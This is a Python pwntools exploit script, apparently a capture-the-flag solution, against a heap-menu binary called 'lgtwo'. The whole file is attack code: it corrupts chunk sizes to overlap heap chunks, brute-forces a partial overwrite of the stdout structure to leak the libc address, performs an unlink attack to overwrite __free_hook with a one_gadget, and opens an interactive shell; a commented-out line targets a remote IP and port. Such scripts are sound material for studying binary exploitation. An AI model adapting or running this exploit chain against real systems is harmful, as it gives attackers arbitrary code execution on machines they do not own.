#!/usr/bin/python
#coding=utf-8
from pwn import *
# context.log_level = 'debug'
context.binary = './lgtwo'
# p = process('./pwn')
elf = ELF('./lgtwo')
libc = elf.libc
def add(size,payload):
	p.sendlineafter('>> ','1')
	p.sendlineafter('?',str(size))
	p.sendafter('?',payload)
def delete(idx):
	p.sendlineafter('>> ','2')
	p.sendlineafter('?',str(idx))

def show(idx):
	p.sendlineafter('>> ','3')
	p.sendlineafter('?',str(idx))

def change(idx,payload):
	p.sendlineafter('>> ','4')
	p.sendlineafter('?',str(idx))
	p.sendafter('?',payload)
buf = 0x6020C0
stdout = 0x602020
fake = 0x6021C0

while(1):
	#p = remote('123.56.52.128','45830')
	p = process('./lgtwo')
	add(0x18,'aaa') #0
	add(0x18,'bbb') #1
	add(0x60,'ccc') #2
	add(0x30,'aaa') #3
	add(0x10,'ddd') #4
	change(0,'a'*0x10+p64(0)+p8(0xd1))
	delete(2) 
	delete(1)
	add(0x18,'aaa') #1
	add(0xa0,'ccc') #2
	change(1,'a'*0x10+p64(0)+'\x70')
	change(2,'\xdd'+'\x15')
	add(0x60,'aaa') #5
	try:
		add(0x68,'bbb') #6
	except EOFError:
		print 'error!!!'
		p.close()
		continue
	change(6,'\x00'*0x33 +p64(0xfbad18a0)+p64(0)*3+p8(0) )
	libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600
	one = [0x45226,0x4527a,0xf0364,0xf1207]
	one_gadget = libc_base+one[1]
	free_hook = libc_base+libc.sym['__free_hook']
	info(hex(libc_base))
	# gdb.attach(p)
	# pause()
	add(0x48, "ddaa") #7
	add(0x80,'ddaa') #8
	add(0x10,'aaaa' ) #9
	payload = p64(0)+p64(0x41)
	payload += p64(buf +7*8- 0x18)  #fd
	payload += p64(buf +7*8- 0x10)  #bk
	payload += 'a'*0x20
	payload += p64(0x40)+p8(0x90) 
	change(7,payload)
	delete(8)
	change(7,p64(0)*3+p64(free_hook))
	change(7,p64(one_gadget))
	delete(9)
	p.interactive()
	exit(0)

